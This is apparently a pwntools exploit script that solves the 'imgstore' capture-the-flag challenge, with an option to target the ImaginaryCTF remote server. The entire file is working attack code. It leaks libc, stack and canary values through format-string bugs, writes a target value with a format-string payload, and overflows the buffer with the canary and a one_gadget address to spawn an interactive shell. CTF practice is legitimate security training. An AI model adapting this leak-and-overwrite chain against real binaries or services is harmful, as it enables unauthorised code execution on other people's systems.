from pwn import *

exe = ELF('./imgstore_patched')
libc = ELF('./libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe.path
# context.log_level = "debug"

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b fgets
        run
    """)
elif args.REMOTE:
    io = remote("imgstore.chal.imaginaryctf.org", 1337)

io.sendlineafter(b'>>', b'3')

# *******************************************
# leak libc
# *******************************************
io.sendlineafter(b'title:', b'%9$p')
io.recvuntil(b'-->')
leak_address = int(io.recvline().strip(), 16)
io.sendlineafter(b'[y/n]:', b'y')
system_addr = 0x7f9e7f9a2290 - 0x7f9e7f9e0e93 + leak_address
libc.address = system_addr - libc.symbols.system
print(f'{hex(libc.symbols.system)}')

# *******************************************
# leak stack
# *******************************************
io.sendlineafter(b'title:', b'%p')
io.recvuntil(b'-->')
leak_address = int(io.recvline().strip(), 16)
io.sendlineafter(b'[y/n]:', b'y')
rsp_addr = 0x7ffd3ee50810 - 0x7ffd3ee4e170 + leak_address
buf_addr = rsp_addr + 8
print(f'{hex(buf_addr) = }') 

# *******************************************
# leak canary
# *******************************************
io.sendlineafter(b'title:', b'%17$p')
io.recvuntil(b'-->')
canary = int(io.recvline().strip(), 16)
io.sendlineafter(b'[y/n]:', b'y')
buf_addr = rsp_addr + 8
print(f'{hex(canary) = }') 

# *******************************************
# format string attack 1
# *******************************************
offset = 8
mod = 1 << 32
target = 0xfeedbeef * pow(0x13f5c223, -1, mod) % mod
writes = {buf_addr: target}
print(writes)
payload = fmtstr_payload(offset, writes, write_size='short')

# *******************************************
# format string attack 2
# *******************************************
# one_gadget
win_addr = libc.address + 0xe3b01
io.sendlineafter(b'title:', payload)
io.sendlineafter(b'>', pack(canary) * 15 + pack(win_addr))
io.interactive()
